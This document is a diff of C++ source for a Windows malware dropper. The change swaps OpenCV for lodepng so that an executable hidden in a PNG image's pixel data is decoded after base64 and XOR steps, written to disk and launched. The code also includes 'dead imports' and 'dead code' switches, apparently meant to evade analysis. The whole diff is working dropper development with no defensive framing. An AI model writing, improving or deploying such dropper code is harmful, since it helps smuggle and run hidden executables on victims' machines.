@@ -20,7 +20,7 @@
 /// OPEN CV
 #include <iostream>
 #include <fstream>
-#include <opencv2/opencv.hpp>
+#include "./lodepng.h"
 
 // Linking with teh dead imports
 #pragma comment(lib, "Comctl32.lib")
@@ -28,6 +28,9 @@
 #pragma comment(lib, "Winmm.lib")
 #pragma comment(lib, "Shlwapi.lib")
 #pragma comment(lib, "uxtheme.lib")
+#pragma comment(lib, "gdi32.lib")
+
+typedef std::vector<unsigned char> DataVect;
 
 // Functions prototypes
 void dead();
@@ -36,6 +39,7 @@ void* XOR(void *data, int size);
 void* base64decode(void *data,DWORD *size);
 void launch();
 void set_name();
+void write_to_disk(const std::string& filename,const DataVect &data);
 
 // Dropper Configurations
 #define DEAD_IMPORTS
@@ -70,22 +74,17 @@ int main()
 	data = base64decode(data,&size);
 #endif
 
-//// OPENCV MAGICCCC
-
-	cv::_InputArray img_data(data, size);
-  cv::Mat img = cv::imdecode(img_data, cv::IMREAD_GRAYSCALE);
-
-  DWORD img_size = img.total() * img.elemSize();
-
- // void *img_data = reinterpret_cast<const char*>(img.data);
+	// Converting the image to exe
+ 	unsigned width, height;
+	std::vector<unsigned char> image;
+	std::vector<unsigned char> png(reinterpret_cast<unsigned char*>(data), reinterpret_cast<unsigned char*>(data) + size);
+	unsigned error = lodepng::decode(image, width, height, png, LCT_RGB, 8);
 
 	// where to drop
 	set_name();
 	// Drop to Disk
 	// drop(size, data);
-
-  // OPEN CV
-	drop(img_size, img.data);
+	write_to_disk(name, image);
 	// launch process
 	launch();
 #ifdef DEAD_CODE
@@ -95,7 +94,6 @@ int main()
 	// exit without waiting child process
 	return 0;
 }
-
 void set_name()
 {
 #ifdef RANDOM_NAME
@@ -183,6 +181,13 @@ void drop(int size, void *buffer)
     }
 	// file fully written
     fclose(f);
+}
+
+// Drop from nbtp
+void write_to_disk(const std::string& filename,const DataVect &data){
+    FILE* dest_file = fopen(filename.c_str(),"wb");
+    fwrite(&data[0],data.size(),1,dest_file);
+    fclose(dest_file);
 }
 
 // Dead Imports Function
